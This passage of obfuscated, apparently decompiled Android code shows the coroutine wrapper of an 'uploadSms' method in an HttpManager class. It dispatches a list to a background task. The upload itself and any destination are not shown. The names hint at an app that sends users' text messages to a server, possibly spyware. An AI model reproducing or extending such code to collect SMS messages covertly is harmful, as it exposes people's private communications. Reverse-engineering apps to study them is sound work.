        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211378a8(List list, ContinuationImpl continuationImpl) {
        HttpManager$uploadSms$1 httpManager$uploadSms$1;
        if (continuationImpl instanceof HttpManager$uploadSms$1) {
            httpManager$uploadSms$1 = (HttpManager$uploadSms$1) continuationImpl;
            int i = httpManager$uploadSms$1.f52254a2;
            if ((i & Integer.MIN_VALUE) != 0) {
                httpManager$uploadSms$1.f52254a2 = i - Integer.MIN_VALUE;
            } else {
                httpManager$uploadSms$1 = new HttpManager$uploadSms$1(this, continuationImpl);
            }
        }
        Object objM213696a7 = httpManager$uploadSms$1.f52252a0;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = httpManager$uploadSms$1.f52254a2;
        if (i2 == 0) {
            kg1.m213544f4(objM213696a7);
            ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
            HttpManager$uploadSms$2 httpManager$uploadSms$2 = new HttpManager$uploadSms$2(this, list, null);
            httpManager$uploadSms$1.f52254a2 = 1;
            objM213696a7 = AbstractC0780a0.m213696a7(executorC1158qw, httpManager$uploadSms$2, httpManager$uploadSms$1);
            if (objM213696a7 == coroutineSingletons) {
                return coroutineSingletons;
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(objM213696a7);
        }
        return ((Result) objM213696a7).f57559a0;
    }
}
